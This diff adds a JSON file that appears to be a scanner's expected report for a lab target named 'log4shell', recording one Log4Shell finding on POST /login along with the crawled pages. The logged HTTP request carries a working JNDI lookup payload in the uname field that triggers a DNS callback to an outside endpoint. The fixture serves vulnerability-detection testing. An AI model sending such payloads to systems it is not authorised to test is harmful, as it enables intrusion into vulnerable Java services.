@@ -1,0 +1,55 @@
+{
+    "vulnerabilities": {
+        "Log4Shell": [
+            {
+                "method": "POST",
+                "path": "/login",
+                "info": "URL http://log4shell/login seems vulnerable to Log4Shell attack by using the body parameter uname",
+                "level": 4,
+                "http_request": "POST /login HTTP/1.1\nhost: log4shell\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: application/x-www-form-urlencoded\nreferer: http://log4shell/\ncookie: JSESSIONID=C264CCA82E0B8CB819C35C2141F6A9BD\ncontent-length: 105\nContent-Type: application/x-www-form-urlencoded\n\nuname=%24%7Bjndi%3Adns%3A%2F%2Fdns-endpoint%2F65d154eb-cd84-4beb-aace-a976d05f8f4f.l%7D&password=Letm3in_",
+                "wstg": [
+                    "WSTG-INPV-11"
+                ],
+                "detail": {
+                    "response": {
+                        "status_code": 200,
+                        "body": "<html><body>\n<code> the password you entered was invalid, <u> we will log your information </u> </code>\n"
+                    }
+                }
+            }
+        ]
+    },
+    "infos": {
+        "target": "http://log4shell/",
+        "crawled_pages_nbr": 3,
+        "crawled_pages": [
+            {
+                "request": {
+                    "url": "http://log4shell/",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "http://log4shell/login",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 405
+                }
+            },
+            {
+                "request": {
+                    "url": "http://log4shell/login",
+                    "method": "POST"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            }
+        ]
+    }
+}
